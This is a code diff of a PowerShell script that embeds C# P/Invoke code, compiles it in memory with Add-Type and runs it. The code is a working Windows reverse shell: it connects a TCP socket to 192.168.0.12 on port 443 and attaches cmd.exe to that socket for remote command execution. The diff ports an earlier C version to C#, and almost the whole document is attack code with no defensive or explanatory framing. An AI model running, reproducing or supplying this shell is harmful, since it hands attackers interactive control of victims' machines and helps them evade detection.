@@ -1,40 +1,96 @@
 $Pimba = @"
+using System;
+using System.Runtime.InteropServices;
 
-#include <winsock2.h>
-#include <stdio.h>
+public class PimbaRunner {
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr WSAStartup(short wVersionRequested, out WSADATA wsaData);
 
-#pragma comment(lib,"ws2_32")
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr WSASocket(int af, int type, int protocol, IntPtr lpProtocolInfo, uint g, uint dwFlags);
 
-WSADATA wsaData;
-SOCKET s1;
-struct sockaddr_in hax;
-char ip_addr[16];
-STARTUPINFO sui;
-PROCESS_INFORMATION pi;
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern int WSAConnect(IntPtr s, ref sockaddr_in name, int namelen, IntPtr lpCallerData, IntPtr lpCalleeData, IntPtr lpSQOS, IntPtr lpGQOS);
 
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
-int _tmain(int argc, _TCHAR* argv[])
-{
-	WSAStartup(MAKEWORD(2, 2), &wsaData);
-	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+    [StructLayout(LayoutKind.Sequential)]
+    public struct WSADATA {
+        public short wVersion;
+        public short wHighVersion;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
+        public string szDescription;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
+        public string szSystemStatus;
+        public short iMaxSockets;
+        public short iMinDdp50;
+        public IntPtr lpVendorInfo;
+    }
 
-	hax.sin_family = AF_INET;
-	hax.sin_port = htons(443);
-	hax.sin_addr.s_addr = inet_addr("192.168.0.12");
+    [StructLayout(LayoutKind.Sequential)]
+    public struct sockaddr_in {
+        public short sin_family;
+        public ushort sin_port;
+        public uint sin_addr;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+        public byte[] sin_zero;
+    }
 
-	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct STARTUPINFO {
+        public int cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
 
-	memset(&sui, 0, sizeof(sui));
-	sui.cb = sizeof(sui);
-	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
 
-	TCHAR commandLine[256] = L"cmd.exe";
-	CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+    public static void Run() {
+        WSADATA wsaData;
+        WSAStartup(0x0202, out wsaData);
+        IntPtr s1 = WSASocket(2, 1, 6, IntPtr.Zero, 0, 0); // AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6
+
+        sockaddr_in hax = new sockaddr_in();
+        hax.sin_family = 2;
+        hax.sin_port = (ushort)((443 << 8) & 0xFF00 | (443 >> 8) & 0x00FF); // htons(443)
+        hax.sin_addr = BitConverter.ToUInt32(System.Net.IPAddress.Parse("192.168.0.12").GetAddressBytes(), 0);
+
+        WSAConnect(s1, ref hax, Marshal.SizeOf(hax), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+
+        STARTUPINFO sui = new STARTUPINFO();
+        sui.cb = Marshal.SizeOf(sui);
+        sui.dwFlags = 0x00000100 | 0x00000001; // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
+        sui.hStdInput = s1;
+        sui.hStdOutput = s1;
+        sui.hStdError = s1;
+
+        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+        CreateProcess(null, "cmd.exe", IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sui, out pi);
+    }
 }
-
 "@
 
-Add-Type $Pimba
-
-[ConsoleApp.Program]::Main("")
+Add-Type -TypeDefinition $Pimba
+[PimbaRunner]::Run()
